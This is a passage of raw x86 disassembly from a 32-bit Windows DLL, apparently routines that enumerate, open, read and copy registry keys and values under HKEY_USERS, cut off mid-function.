10007a08:	0f 84 c3 00 00 00    	je     0x10007ad1
10007a0e:	8d 4d b8             	lea    -0x48(%ebp),%ecx
10007a11:	51                   	push   %ecx
10007a12:	8d 4d c8             	lea    -0x38(%ebp),%ecx
10007a15:	51                   	push   %ecx
10007a16:	50                   	push   %eax
10007a17:	8d 45 d0             	lea    -0x30(%ebp),%eax
10007a1a:	50                   	push   %eax
10007a1b:	ff 75 f4             	push   -0xc(%ebp)
10007a1e:	ff 75 f8             	push   -0x8(%ebp)
10007a21:	53                   	push   %ebx
10007a22:	ff d7                	call   *%edi
10007a24:	85 c0                	test   %eax,%eax
10007a26:	0f 84 93 00 00 00    	je     0x10007abf
10007a2c:	8d 45 f0             	lea    -0x10(%ebp),%eax
10007a2f:	89 5d f0             	mov    %ebx,-0x10(%ebp)
10007a32:	50                   	push   %eax
10007a33:	53                   	push   %ebx
10007a34:	ff 75 f4             	push   -0xc(%ebp)
10007a37:	e8 ce fb ff ff       	call   0x1000760a
10007a3c:	83 c4 0c             	add    $0xc,%esp
10007a3f:	85 c0                	test   %eax,%eax
10007a41:	75 7c                	jne    0x10007abf
10007a43:	ff 15 60 e1 00 10    	call   *0x1000e160
10007a49:	3b c6                	cmp    %esi,%eax
10007a4b:	75 72                	jne    0x10007abf
10007a4d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
10007a50:	3b cb                	cmp    %ebx,%ecx
10007a52:	74 0c                	je     0x10007a60
10007a54:	8b 45 c0             	mov    -0x40(%ebp),%eax
10007a57:	39 01                	cmp    %eax,(%ecx)
10007a59:	73 05                	jae    0x10007a60
10007a5b:	89 01                	mov    %eax,(%ecx)
10007a5d:	89 75 fc             	mov    %esi,-0x4(%ebp)
10007a60:	8b 7d 14             	mov    0x14(%ebp),%edi
10007a63:	3b fb                	cmp    %ebx,%edi
10007a65:	74 0c                	je     0x10007a73
10007a67:	8b 45 f0             	mov    -0x10(%ebp),%eax
10007a6a:	39 07                	cmp    %eax,(%edi)
10007a6c:	73 05                	jae    0x10007a73
10007a6e:	89 07                	mov    %eax,(%edi)
10007a70:	89 75 fc             	mov    %esi,-0x4(%ebp)
10007a73:	39 75 fc             	cmp    %esi,-0x4(%ebp)
10007a76:	74 47                	je     0x10007abf
10007a78:	39 5d 08             	cmp    %ebx,0x8(%ebp)
10007a7b:	74 18                	je     0x10007a95
10007a7d:	ff 75 f8             	push   -0x8(%ebp)
10007a80:	ff 75 08             	push   0x8(%ebp)
10007a83:	ff 15 d8 e0 00 10    	call   *0x1000e0d8
10007a89:	3b fb                	cmp    %ebx,%edi
10007a8b:	74 05                	je     0x10007a92
10007a8d:	8b 45 f0             	mov    -0x10(%ebp),%eax
10007a90:	89 07                	mov    %eax,(%edi)
10007a92:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10007a95:	39 5d 10             	cmp    %ebx,0x10(%ebp)
10007a98:	74 25                	je     0x10007abf
10007a9a:	8d 45 f0             	lea    -0x10(%ebp),%eax
10007a9d:	50                   	push   %eax
10007a9e:	ff 75 10             	push   0x10(%ebp)
10007aa1:	ff 75 f4             	push   -0xc(%ebp)
10007aa4:	e8 61 fb ff ff       	call   0x1000760a
10007aa9:	83 c4 0c             	add    $0xc,%esp
10007aac:	85 c0                	test   %eax,%eax
10007aae:	75 0f                	jne    0x10007abf
10007ab0:	8b 45 0c             	mov    0xc(%ebp),%eax
10007ab3:	3b c3                	cmp    %ebx,%eax
10007ab5:	74 05                	je     0x10007abc
10007ab7:	8b 4d c0             	mov    -0x40(%ebp),%ecx
10007aba:	89 08                	mov    %ecx,(%eax)
10007abc:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10007abf:	ff 75 f4             	push   -0xc(%ebp)
10007ac2:	e8 03 5a 00 00       	call   0x1000d4ca
10007ac7:	ff 75 c4             	push   -0x3c(%ebp)
10007aca:	e8 fb 59 00 00       	call   0x1000d4ca
10007acf:	59                   	pop    %ecx
10007ad0:	59                   	pop    %ecx
10007ad1:	ff 75 f8             	push   -0x8(%ebp)
10007ad4:	ff 15 34 08 01 10    	call   *0x10010834
10007ada:	89 5d f8             	mov    %ebx,-0x8(%ebp)
10007add:	ff 45 ec             	incl   -0x14(%ebp)
10007ae0:	83 45 d4 0c          	addl   $0xc,-0x2c(%ebp)
10007ae4:	8b 45 ec             	mov    -0x14(%ebp),%eax
10007ae7:	3b 45 bc             	cmp    -0x44(%ebp),%eax
10007aea:	0f 82 90 fe ff ff    	jb     0x10007980
10007af0:	ff 75 e8             	push   -0x18(%ebp)
10007af3:	ff 15 34 08 01 10    	call   *0x10010834
10007af9:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
10007afc:	0f 84 a8 01 00 00    	je     0x10007caa
10007b02:	83 7d fc 7a          	cmpl   $0x7a,-0x4(%ebp)
10007b06:	0f 84 9e 01 00 00    	je     0x10007caa
10007b0c:	53                   	push   %ebx
10007b0d:	53                   	push   %ebx
10007b0e:	8b 3d 0c e0 00 10    	mov    0x1000e00c,%edi
10007b14:	53                   	push   %ebx
10007b15:	8d 45 f8             	lea    -0x8(%ebp),%eax
10007b18:	53                   	push   %ebx
10007b19:	50                   	push   %eax
10007b1a:	8d 85 b4 fe ff ff    	lea    -0x14c(%ebp),%eax
10007b20:	50                   	push   %eax
10007b21:	53                   	push   %ebx
10007b22:	68 03 00 00 80       	push   $0x80000003
10007b27:	c7 45 f8 04 01 00 00 	movl   $0x104,-0x8(%ebp)
10007b2e:	89 5d ec             	mov    %ebx,-0x14(%ebp)
10007b31:	ff d7                	call   *%edi
10007b33:	3d 03 01 00 00       	cmp    $0x103,%eax
10007b38:	0f 84 66 01 00 00    	je     0x10007ca4
10007b3e:	8d 45 dc             	lea    -0x24(%ebp),%eax
10007b41:	50                   	push   %eax
10007b42:	8d 85 b4 fe ff ff    	lea    -0x14c(%ebp),%eax
10007b48:	50                   	push   %eax
10007b49:	ff 15 a0 e1 00 10    	call   *0x1000e1a0
10007b4f:	59                   	pop    %ecx
10007b50:	85 c0                	test   %eax,%eax
10007b52:	59                   	pop    %ecx
10007b53:	75 16                	jne    0x10007b6b
10007b55:	8d 85 b4 fe ff ff    	lea    -0x14c(%ebp),%eax
10007b5b:	50                   	push   %eax
10007b5c:	ff 15 a8 e0 00 10    	call   *0x1000e0a8
10007b62:	83 f8 14             	cmp    $0x14,%eax
10007b65:	0f 8e 00 01 00 00    	jle    0x10007c6b
10007b6b:	8d 85 b4 fe ff ff    	lea    -0x14c(%ebp),%eax
10007b71:	50                   	push   %eax
10007b72:	e8 a5 fb ff ff       	call   0x1000771c
10007b77:	3b c3                	cmp    %ebx,%eax
10007b79:	59                   	pop    %ecx
10007b7a:	89 45 e8             	mov    %eax,-0x18(%ebp)
10007b7d:	0f 84 e8 00 00 00    	je     0x10007c6b
10007b83:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
10007b86:	89 5d f4             	mov    %ebx,-0xc(%ebp)
10007b89:	51                   	push   %ecx
10007b8a:	8d 4d f0             	lea    -0x10(%ebp),%ecx
10007b8d:	51                   	push   %ecx
10007b8e:	8d 4d f4             	lea    -0xc(%ebp),%ecx
10007b91:	53                   	push   %ebx
10007b92:	51                   	push   %ecx
10007b93:	ff 75 08             	push   0x8(%ebp)
10007b96:	89 5d f0             	mov    %ebx,-0x10(%ebp)
10007b99:	50                   	push   %eax
10007b9a:	53                   	push   %ebx
10007b9b:	ff 15 10 e0 00 10    	call   *0x1000e010
10007ba1:	85 c0                	test   %eax,%eax
10007ba3:	0f 85 c2 00 00 00    	jne    0x10007c6b
10007ba9:	ff 15 60 e1 00 10    	call   *0x1000e160
10007baf:	6a 7a                	push   $0x7a
10007bb1:	5a                   	pop    %edx
10007bb2:	3b c2                	cmp    %edx,%eax
10007bb4:	0f 85 a8 00 00 00    	jne    0x10007c62
10007bba:	8b 45 f4             	mov    -0xc(%ebp),%eax
10007bbd:	3b c3                	cmp    %ebx,%eax
10007bbf:	0f 84 9d 00 00 00    	je     0x10007c62
10007bc5:	39 5d f0             	cmp    %ebx,-0x10(%ebp)
10007bc8:	0f 84 94 00 00 00    	je     0x10007c62
10007bce:	8b 4d 0c             	mov    0xc(%ebp),%ecx
10007bd1:	3b cb                	cmp    %ebx,%ecx
10007bd3:	74 09                	je     0x10007bde
10007bd5:	39 01                	cmp    %eax,(%ecx)
10007bd7:	73 05                	jae    0x10007bde
10007bd9:	89 01                	mov    %eax,(%ecx)
10007bdb:	89 55 fc             	mov    %edx,-0x4(%ebp)
10007bde:	8b 4d 14             	mov    0x14(%ebp),%ecx
10007be1:	3b cb                	cmp    %ebx,%ecx
10007be3:	74 0c                	je     0x10007bf1
10007be5:	8b 45 f8             	mov    -0x8(%ebp),%eax
10007be8:	39 01                	cmp    %eax,(%ecx)
10007bea:	73 05                	jae    0x10007bf1
10007bec:	89 01                	mov    %eax,(%ecx)
10007bee:	89 55 fc             	mov    %edx,-0x4(%ebp)
10007bf1:	39 55 fc             	cmp    %edx,-0x4(%ebp)
10007bf4:	74 6c                	je     0x10007c62
10007bf6:	ff 75 f0             	push   -0x10(%ebp)
10007bf9:	e8 d2 58 00 00       	call   0x1000d4d0
10007bfe:	39 5d 08             	cmp    %ebx,0x8(%ebp)
10007c01:	59                   	pop    %ecx
10007c02:	8b f0                	mov    %eax,%esi
10007c04:	74 5c                	je     0x10007c62
10007c06:	3b f3                	cmp    %ebx,%esi
10007c08:	74 58                	je     0x10007c62
10007c0a:	8d 45 c4             	lea    -0x3c(%ebp),%eax
10007c0d:	50                   	push   %eax
10007c0e:	8d 45 f0             	lea    -0x10(%ebp),%eax
10007c11:	50                   	push   %eax
10007c12:	8d 45 f4             	lea    -0xc(%ebp),%eax
10007c15:	56                   	push   %esi
10007c16:	50                   	push   %eax
10007c17:	ff 75 08             	push   0x8(%ebp)
10007c1a:	ff 75 e8             	push   -0x18(%ebp)
10007c1d:	53                   	push   %ebx
10007c1e:	ff 15 10 e0 00 10    	call   *0x1000e010
10007c24:	85 c0                	test   %eax,%eax
10007c26:	74 33                	je     0x10007c5b
10007c28:	39 5d 10             	cmp    %ebx,0x10(%ebp)
10007c2b:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10007c2e:	74 1f                	je     0x10007c4f
10007c30:	8d 85 b4 fe ff ff    	lea    -0x14c(%ebp),%eax
10007c36:	50                   	push   %eax
10007c37:	ff 75 10             	push   0x10(%ebp)
10007c3a:	ff 15 d8 e0 00 10    	call   *0x1000e0d8
10007c40:	8b 45 14             	mov    0x14(%ebp),%eax
10007c43:	3b c3                	cmp    %ebx,%eax
10007c45:	74 05                	je     0x10007c4c
10007c47:	8b 4d f8             	mov    -0x8(%ebp),%ecx
10007c4a:	89 08                	mov    %ecx,(%eax)
10007c4c:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10007c4f:	8b 45 0c             	mov    0xc(%ebp),%eax
10007c52:	3b c3                	cmp    %ebx,%eax
10007c54:	74 05                	je     0x10007c5b
10007c56:	8b 4d f4             	mov    -0xc(%ebp),%ecx
10007c59:	89 08                	mov    %ecx,(%eax)
10007c5b:	56                   	push   %esi
10007c5c:	e8 69 58 00 00       	call   0x1000d4ca
10007c61:	59                   	pop    %ecx
10007c62:	ff 75 e8             	push   -0x18(%ebp)
10007c65:	ff 15 38 e0 00 10    	call   *0x1000e038
10007c6b:	ff 45 ec             	incl   -0x14(%ebp)
10007c6e:	53                   	push   %ebx
10007c6f:	53                   	push   %ebx
10007c70:	53                   	push   %ebx
10007c71:	8d 45 f8             	lea    -0x8(%ebp),%eax
10007c74:	53                   	push   %ebx
10007c75:	50                   	push   %eax
10007c76:	8d 85 b4 fe ff ff    	lea    -0x14c(%ebp),%eax
10007c7c:	50                   	push   %eax
10007c7d:	88 9d b4 fe ff ff    	mov    %bl,-0x14c(%ebp)
10007c83:	ff 75 ec             	push   -0x14(%ebp)
10007c86:	c7 45 f8 04 01 00 00 	movl   $0x104,-0x8(%ebp)
10007c8d:	68 03 00 00 80       	push   $0x80000003
10007c92:	ff d7                	call   *%edi
10007c94:	3d 03 01 00 00       	cmp    $0x103,%eax
10007c99:	74 09                	je     0x10007ca4
10007c9b:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
10007c9e:	0f 85 9a fe ff ff    	jne    0x10007b3e
10007ca4:	83 7d d8 01          	cmpl   $0x1,-0x28(%ebp)
10007ca8:	75 0e                	jne    0x10007cb8
10007caa:	39 5d cc             	cmp    %ebx,-0x34(%ebp)
10007cad:	74 09                	je     0x10007cb8
10007caf:	ff 75 cc             	push   -0x34(%ebp)
10007cb2:	ff 15 98 e0 00 10    	call   *0x1000e098
10007cb8:	ff 75 fc             	push   -0x4(%ebp)
10007cbb:	89 1d 2c 08 01 10    	mov    %ebx,0x1001082c
10007cc1:	89 1d 30 08 01 10    	mov    %ebx,0x10010830
10007cc7:	89 1d 34 08 01 10    	mov    %ebx,0x10010834
10007ccd:	ff 15 d4 e0 00 10    	call   *0x1000e0d4
10007cd3:	8b 45 fc             	mov    -0x4(%ebp),%eax
10007cd6:	5f                   	pop    %edi
10007cd7:	5e                   	pop    %esi
10007cd8:	5b                   	pop    %ebx
10007cd9:	c9                   	leave
10007cda:	c3                   	ret
10007cdb:	55                   	push   %ebp
10007cdc:	8b ec                	mov    %esp,%ebp
10007cde:	81 ec 14 04 00 00    	sub    $0x414,%esp
10007ce4:	8a 15 6c 07 01 10    	mov    0x1001076c,%dl
10007cea:	53                   	push   %ebx
10007ceb:	56                   	push   %esi
10007cec:	57                   	push   %edi
10007ced:	6a 7f                	push   $0x7f
10007cef:	33 c0                	xor    %eax,%eax
10007cf1:	59                   	pop    %ecx
10007cf2:	8d bd ed fb ff ff    	lea    -0x413(%ebp),%edi
10007cf8:	88 95 ec fb ff ff    	mov    %dl,-0x414(%ebp)
10007cfe:	6a 7f                	push   $0x7f
10007d00:	f3 ab                	rep stos %eax,%es:(%edi)
10007d02:	66 ab                	stos   %ax,%es:(%edi)
10007d04:	aa                   	stos   %al,%es:(%edi)
10007d05:	59                   	pop    %ecx
10007d06:	33 c0                	xor    %eax,%eax
10007d08:	8d bd ed fd ff ff    	lea    -0x213(%ebp),%edi
10007d0e:	88 95 ec fd ff ff    	mov    %dl,-0x214(%ebp)
10007d14:	f3 ab                	rep stos %eax,%es:(%edi)
10007d16:	66 ab                	stos   %ax,%es:(%edi)
10007d18:	aa                   	stos   %al,%es:(%edi)
10007d19:	8d 45 fc             	lea    -0x4(%ebp),%eax
10007d1c:	33 db                	xor    %ebx,%ebx
10007d1e:	50                   	push   %eax
10007d1f:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
10007d25:	50                   	push   %eax
10007d26:	8d 45 f0             	lea    -0x10(%ebp),%eax
10007d29:	50                   	push   %eax
10007d2a:	8d 45 f8             	lea    -0x8(%ebp),%eax
10007d2d:	53                   	push   %ebx
10007d2e:	8b 3d 04 e0 00 10    	mov    0x1000e004,%edi
10007d34:	50                   	push   %eax
10007d35:	8d 85 ec fb ff ff    	lea    -0x414(%ebp),%eax
10007d3b:	50                   	push   %eax
10007d3c:	53                   	push   %ebx
10007d3d:	ff 75 08             	push   0x8(%ebp)
10007d40:	be 00 02 00 00       	mov    $0x200,%esi
10007d45:	89 5d ec             	mov    %ebx,-0x14(%ebp)
10007d48:	89 75 f8             	mov    %esi,-0x8(%ebp)
10007d4b:	89 75 fc             	mov    %esi,-0x4(%ebp)
10007d4e:	89 5d f4             	mov    %ebx,-0xc(%ebp)
10007d51:	ff d7                	call   *%edi
10007d53:	85 c0                	test   %eax,%eax
10007d55:	75 61                	jne    0x10007db8
10007d57:	ff 75 fc             	push   -0x4(%ebp)
10007d5a:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
10007d60:	50                   	push   %eax
10007d61:	8d 85 ec fb ff ff    	lea    -0x414(%ebp),%eax
10007d67:	ff 75 f0             	push   -0x10(%ebp)
10007d6a:	53                   	push   %ebx
10007d6b:	50                   	push   %eax
10007d6c:	ff 75 0c             	push   0xc(%ebp)
10007d6f:	ff 15 4c e0 00 10    	call   *0x1000e04c
10007d75:	8d 45 fc             	lea    -0x4(%ebp),%eax
10007d78:	ff 45 f4             	incl   -0xc(%ebp)
10007d7b:	50                   	push   %eax
10007d7c:	8d 85 ec fd ff ff    	lea    -0x214(%ebp),%eax
10007d82:	50                   	push   %eax
10007d83:	8d 45 f0             	lea    -0x10(%ebp),%eax
10007d86:	50                   	push   %eax
10007d87:	8d 45 f8             	lea    -0x8(%ebp),%eax
10007d8a:	53                   	push   %ebx
10007d8b:	50                   	push   %eax
10007d8c:	8d 85 ec fb ff ff    	lea    -0x414(%ebp),%eax
10007d92:	89 75 f8             	mov    %esi,-0x8(%ebp)
10007d95:	50                   	push   %eax
10007d96:	88 9d ec fb ff ff    	mov    %bl,-0x414(%ebp)
10007d9c:	ff 75 f4             	push   -0xc(%ebp)
10007d9f:	89 75 fc             	mov    %esi,-0x4(%ebp)
10007da2:	88 9d ec fd ff ff    	mov    %bl,-0x214(%ebp)
10007da8:	ff 75 08             	push   0x8(%ebp)
10007dab:	ff d7                	call   *%edi
10007dad:	85 c0                	test   %eax,%eax
10007daf:	74 a6                	je     0x10007d57
10007db1:	c7 45 ec 01 00 00 00 	movl   $0x1,-0x14(%ebp)
10007db8:	8b 45 ec             	mov    -0x14(%ebp),%eax
10007dbb:	5f                   	pop    %edi
10007dbc:	5e                   	pop    %esi
10007dbd:	5b                   	pop    %ebx
10007dbe:	c9                   	leave
10007dbf:	c3                   	ret
10007dc0:	55                   	push   %ebp
10007dc1:	8b ec                	mov    %esp,%ebp
10007dc3:	51                   	push   %ecx
10007dc4:	53                   	push   %ebx
10007dc5:	56                   	push   %esi
10007dc6:	8d 45 fc             	lea    -0x4(%ebp),%eax
10007dc9:	57                   	push   %edi
10007dca:	33 ff                	xor    %edi,%edi
10007dcc:	50                   	push   %eax
10007dcd:	6a 01                	push   $0x1
10007dcf:	be c0 01 01 10       	mov    $0x100101c0,%esi
10007dd4:	57                   	push   %edi
10007dd5:	56                   	push   %esi
10007dd6:	ff 75 08             	push   0x8(%ebp)
10007dd9:	33 db                	xor    %ebx,%ebx
10007ddb:	ff 15 3c e0 00 10    	call   *0x1000e03c
10007de1:	85 c0                	test   %eax,%eax
10007de3:	75 42                	jne    0x10007e27
10007de5:	8d 45 08             	lea    0x8(%ebp),%eax
10007de8:	57                   	push   %edi
10007de9:	50                   	push   %eax
10007dea:	57                   	push   %edi
10007deb:	68 1f 00 02 00       	push   $0x2001f
10007df0:	57                   	push   %edi
10007df1:	68 6c 07 01 10       	push   $0x1001076c
10007df6:	57                   	push   %edi
10007df7:	56                   	push   %esi
10007df8:	ff 75 0c             	push   0xc(%ebp)
10007dfb:	ff 15 44 e0 00 10    	call   *0x1000e044
10007e01:	8b 35 48 e0 00 10    	mov    0x1000e048,%esi
10007e07:	85 c0                	test   %eax,%eax
10007e09:	75 17                	jne    0x10007e22
10007e0b:	ff 75 08             	push   0x8(%ebp)
10007e0e:	ff 75 fc             	push   -0x4(%ebp)
10007e11:	e8 c5 fe ff ff       	call   0x10007cdb
10007e16:	59                   	pop    %ecx
10007e17:	8b d8                	mov    %eax,%ebx
10007e19:	59                   	pop    %ecx
10007e1a:	ff 75 08             	push   0x8(%ebp)
10007e1d:	ff d6                	call   *%esi
10007e1f:	89 7d 08             	mov    %edi,0x8(%ebp)
10007e22:	ff 75 fc             	push   -0x4(%ebp)
10007e25:	ff d6                	call   *%esi
10007e27:	5f                   	pop    %edi
10007e28:	8b c3                	mov    %ebx,%eax
10007e2a:	5e                   	pop    %esi
10007e2b:	5b                   	pop    %ebx
10007e2c:	c9                   	leave
10007e2d:	c3                   	ret
10007e2e:	55                   	push   %ebp
10007e2f:	8b ec                	mov    %esp,%ebp
10007e31:	81 ec 0c 02 00 00    	sub    $0x20c,%esp
10007e37:	53                   	push   %ebx
10007e38:	56                   	push   %esi
10007e39:	57                   	push   %edi
10007e3a:	33 ff                	xor    %edi,%edi
10007e3c:	68 ff 00 00 00       	push   $0xff
10007e41:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
10007e47:	57                   	push   %edi
10007e48:	50                   	push   %eax
10007e49:	89 7d f4             	mov    %edi,-0xc(%ebp)
10007e4c:	e8 c5 54 00 00       	call   0x1000d316
10007e51:	8b 1d d8 e0 00 10    	mov    0x1000e0d8,%ebx
10007e57:	83 c4 0c             	add    $0xc,%esp
10007e5a:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
10007e60:	68 00 02 01 10       	push   $0x10010200
10007e65:	50                   	push   %eax
10007e66:	ff d3                	call   *%ebx
10007e68:	8b 35 e0 e0 00 10    	mov    0x1000e0e0,%esi
10007e6e:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
10007e74:	68 3c 00 01 10       	push   $0x1001003c
10007e79:	50                   	push   %eax
10007e7a:	ff d6                	call   *%esi
10007e7c:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
10007e82:	68 60 02 01 10       	push   $0x10010260
10007e87:	50                   	push   %eax
10007e88:	ff d6                	call   *%esi
10007e8a:	8b 35 3c e0 00 10    	mov    0x1000e03c,%esi
10007e90:	8d 45 f8             	lea    -0x8(%ebp),%eax
10007e93:	50                   	push   %eax
10007e94:	68 06 00 02 00       	push   $0x20006
10007e99:	57                   	push   %edi
10007e9a:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
10007ea0:	bf 03 00 00 80       	mov    $0x80000003,%edi
10007ea5:	50                   	push   %eax
10007ea6:	57                   	push   %edi
10007ea7:	ff d6                	call   *%esi
10007ea9:	85 c0                	test   %eax,%eax
10007eab:	0f 85 90 00 00 00    	jne    0x10007f41
10007eb1:	8d 45 fc             	lea    -0x4(%ebp),%eax
10007eb4:	50                   	push   %eax
10007eb5:	68 19 00 02 00       	push   $0x20019
10007eba:	6a 00                	push   $0x0
10007ebc:	ff 75 08             	push   0x8(%ebp)
10007ebf:	57                   	push   %edi
10007ec0:	ff d6                	call   *%esi
10007ec2:	8b 3d 48 e0 00 10    	mov    0x1000e048,%edi
10007ec8:	85 c0                	test   %eax,%eax
10007eca:	75 70                	jne    0x10007f3c
10007ecc:	68 ff 00 00 00       	push   $0xff
10007ed1:	8d 85 f4 fd ff ff    	lea    -0x20c(%ebp),%eax
10007ed7:	6a 00                	push   $0x0
10007ed9:	50                   	push   %eax
10007eda:	e8 37 54 00 00       	call   0x1000d316
10007edf:	83 c4 0c             	add    $0xc,%esp
10007ee2:	8d 85 f4 fd ff ff    	lea    -0x20c(%ebp),%eax
10007ee8:	68 60 02 01 10       	push   $0x10010260
10007eed:	50                   	push   %eax
10007eee:	ff d3                	call   *%ebx
10007ef0:	8d 45 08             	lea    0x8(%ebp),%eax
10007ef3:	33 db                	xor    %ebx,%ebx
10007ef5:	50                   	push   %eax
10007ef6:	68 19 00 02 00       	push   $0x20019
10007efb:	8d 85 f4 fd ff ff    	lea    -0x20c(%ebp),%eax
10007f01:	53                   	push   %ebx
10007f02:	50                   	push   %eax
10007f03:	ff 75 fc             	push   -0x4(%ebp)
10007f06:	ff d6                	call   *%esi
10007f08:	85 c0                	test   %eax,%eax
10007f0a:	75 28                	jne    0x10007f34
10007f0c:	ff 75 f8             	push   -0x8(%ebp)
10007f0f:	ff 75 08             	push   0x8(%ebp)
10007f12:	e8 c4 fd ff ff       	call   0x10007cdb
10007f17:	ff 75 f8             	push   -0x8(%ebp)
10007f1a:	ff 75 08             	push   0x8(%ebp)
10007f1d:	e8 9e fe ff ff       	call   0x10007dc0
10007f22:	83 c4 10             	add    $0x10,%esp
10007f25:	ff 75 08             	push   0x8(%ebp)
10007f28:	ff d7                	call   *%edi
10007f2a:	89 5d 08             	mov    %ebx,0x8(%ebp)
10007f2d:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
10007f34:	ff 75 fc             	push   -0x4(%ebp)
10007f37:	ff d7                	call   *%edi
10007f39:	89 5d fc             	mov    %ebx,-0x4(%ebp)
10007f3c:	ff 75 f8             	push   -0x8(%ebp)
10007f3f:	ff d7                	call   *%edi
10007f41:	8b 45 f4             	mov    -0xc(%ebp),%eax
10007f44:	5f                   	pop    %edi
10007f45:	5e                   	pop    %esi
10007f46:	5b                   	pop    %ebx
10007f47:	c9                   	leave
10007f48:	c3                   	ret
10007f49:	55                   	push   %ebp
10007f4a:	8b ec                	mov    %esp,%ebp
10007f4c:	81 ec 1c 01 00 00    	sub    $0x11c,%esp
10007f52:	53                   	push   %ebx
10007f53:	56                   	push   %esi
10007f54:	57                   	push   %edi
10007f55:	33 db                	xor    %ebx,%ebx
10007f57:	68 ff 00 00 00       	push   $0xff
10007f5c:	8d 85 e4 fe ff ff    	lea    -0x11c(%ebp),%eax
10007f62:	53                   	push   %ebx
10007f63:	50                   	push   %eax
10007f64:	89 5d f4             	mov    %ebx,-0xc(%ebp)
10007f67:	e8 aa 53 00 00       	call   0x1000d316
10007f6c:	83 c4 0c             	add    $0xc,%esp
10007f6f:	8d 85 e4 fe ff ff    	lea    -0x11c(%ebp),%eax
10007f75:	68 00 02 01 10       	push   $0x10010200
10007f7a:	50                   	push   %eax
10007f7b:	ff 15 d8 e0 00 10    	call   *0x1000e0d8
10007f81:	8b 35 e0 e0 00 10    	mov    0x1000e0e0,%esi
10007f87:	8d 85 e4 fe ff ff    	lea    -0x11c(%ebp),%eax
10007f8d:	68 3c 00 01 10       	push   $0x1001003c
10007f92:	50                   	push   %eax
10007f93:	ff d6                	call   *%esi
10007f95:	8d 85 e4 fe ff ff    	lea    -0x11c(%ebp),%eax
10007f9b:	68 60 02 01 10       	push   $0x10010260
10007fa0:	50                   	push   %eax
10007fa1:	ff d6                	call   *%esi
10007fa3:	8b 3d 3c e0 00 10    	mov    0x1000e03c,%edi
10007fa9:	8d 45 fc             	lea    -0x4(%ebp),%eax
10007fac:	50                   	push   %eax
10007fad:	68 1f 00 02 00       	push   $0x2001f
10007fb2:	8d 85 e4 fe ff ff    	lea    -0x11c(%ebp),%eax
10007fb8:	53                   	push   %ebx
10007fb9:	50                   	push   %eax
10007fba:	68 03 00 00 80       	push   $0x80000003
10007fbf:	ff d7                	call   *%edi
10007fc1:	85 c0                	test   %eax,%eax
10007fc3:	0f 85 8c 01 00 00    	jne    0x10008155
10007fc9:	8d 85 e4 fe ff ff    	lea    -0x11c(%ebp),%eax
10007fcf:	68 3c 00 01 10       	push   $0x1001003c
10007fd4:	50                   	push   %eax
10007fd5:	ff d6                	call   *%esi
10007fd7:	8d 85 e4 fe ff ff    	lea    -0x11c(%ebp),%eax
10007fdd:	68 c0 01 01 10       	push   $0x100101c0
10007fe2:	50                   	push   %eax
10007fe3:	ff d6                	call   *%esi
10007fe5:	8d 45 f8             	lea    -0x8(%ebp),%eax
10007fe8:	50                   	push   %eax
10007fe9:	68 1f 00 02 00       	push   $0x2001f
10007fee:	8d 85 e4 fe ff ff    	lea    -0x11c(%ebp),%eax
10007ff4:	53                   	push   %ebx
10007ff5:	50                   	push   %eax
10007ff6:	68 03 00 00 80       	push   $0x80000003
10007ffb:	ff d7                	call   *%edi
10007ffd:	85 c0                	test   %eax,%eax
10007fff:	0f 85 47 01 00 00    	jne    0x1000814c
10008005:	8d 45 f0             	lea    -0x10(%ebp),%eax
10008008:	8b 3d 40 e0 00 10    	mov    0x1000e040,%edi
1000800e:	50                   	push   %eax
1000800f:	53                   	push   %ebx
10008010:	53                   	push   %ebx
10008011:	53                   	push   %ebx
10008012:	68 cc 01 01 10       	push   $0x100101cc
10008017:	89 5d f0             	mov    %ebx,-0x10(%ebp)
1000801a:	ff 75 f8             	push   -0x8(%ebp)
1000801d:	ff d7                	call   *%edi
1000801f:	85 c0                	test   %eax,%eax
10008021:	0f 85 19 01 00 00    	jne    0x10008140
10008027:	ff 75 f0             	push   -0x10(%ebp)
1000802a:	6a 40                	push   $0x40
1000802c:	ff 15 c4 e0 00 10    	call   *0x1000e0c4
10008032:	8b f0                	mov    %eax,%esi
10008034:	3b f3                	cmp    %ebx,%esi
10008036:	89 75 e4             	mov    %esi,-0x1c(%ebp)
10008039:	0f 84 01 01 00 00    	je     0x10008140
1000803f:	8d 45 f0             	lea    -0x10(%ebp),%eax
10008042:	50                   	push   %eax
10008043:	56                   	push   %esi
10008044:	53                   	push   %ebx
10008045:	53                   	push   %ebx
10008046:	68 cc 01 01 10       	push   $0x100101cc
1000804b:	ff 75 f8             	push   -0x8(%ebp)
1000804e:	ff d7                	call   *%edi
10008050:	85 c0                	test   %eax,%eax
10008052:	0f 85 e1 00 00 00    	jne    0x10008139
10008058:	8b 46 08             	mov    0x8(%esi),%eax
1000805b:	83 c6 08             	add    $0x8,%esi
1000805e:	8b 3d 4c e0 00 10    	mov    0x1000e04c,%edi
10008064:	83 c6 04             	add    $0x4,%esi
10008067:	89 45 f4             	mov    %eax,-0xc(%ebp)
1000806a:	89 5d ec             	mov    %ebx,-0x14(%ebp)
1000806d:	8b 06                	mov    (%esi),%eax
1000806f:	83 c6 04             	add    $0x4,%esi
10008072:	3b c3                	cmp    %ebx,%eax
10008074:	89 45 e8             	mov    %eax,-0x18(%ebp)
10008077:	74 20                	je     0x10008099
10008079:	50                   	push   %eax
1000807a:	56                   	push   %esi
1000807b:	6a 01                	push   $0x1
1000807d:	53                   	push   %ebx
1000807e:	68 88 01 01 10       	push   $0x10010188
10008083:	ff 75 fc             	push   -0x4(%ebp)
10008086:	ff d7                	call   *%edi
10008088:	85 c0                	test   %eax,%eax
1000808a:	75 1e                	jne    0x100080aa
1000808c:	8b 45 f4             	mov    -0xc(%ebp),%eax
1000808f:	d1 e8                	shr    $1,%eax
10008091:	83 e0 01             	and    $0x1,%eax
